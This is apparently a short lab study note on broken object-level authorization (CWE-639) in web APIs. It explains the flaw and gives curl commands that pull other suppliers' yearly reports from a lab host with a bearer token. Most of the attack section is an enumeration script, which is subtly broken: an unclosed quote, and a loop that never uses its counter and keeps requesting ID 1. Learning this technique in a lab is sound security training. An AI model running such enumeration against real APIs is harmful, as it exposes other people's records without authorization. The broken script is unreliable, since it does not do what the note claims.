Web APIs allow users to request data or records by sending various parameters, including unique identifiers such as `Universally Unique Identifiers` (`UUIDs`), also known as `Globally Unique Identifiers` (`GUIDs`), and integer IDs. However, failing to properly and securely verify that a user has ownership and permission to view a specific resource through `object-level authorization mechanisms` can lead to data exposure and security vulnerabilities.
## Authorization Bypass Through User-Controlled Key

The endpoint we will be practicing against is vulnerable to [CWE-639: Authorization Bypass Through User-Controlled Key](https://cwe.mitre.org/data/definitions/639.html).

## enumeration scripts

```shell-session
for ((i=1; i<= 20; i++)); do
curl -s -w "\n" -X 'GET' \
  'http://94.237.52.235:34601/api/v1/supplier-companies/yearly-reports/1 \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer <JWTVAL>' | jq
done
```

Accessing report data for other suppliers
```bash
curl -X 'GET' \
  'http://94.237.52.235:34601/api/v1/supplier-companies/yearly-reports/1' \
  -H 'accept: application/json' \
  -H 'Authorization: Bearer Jwt'
```

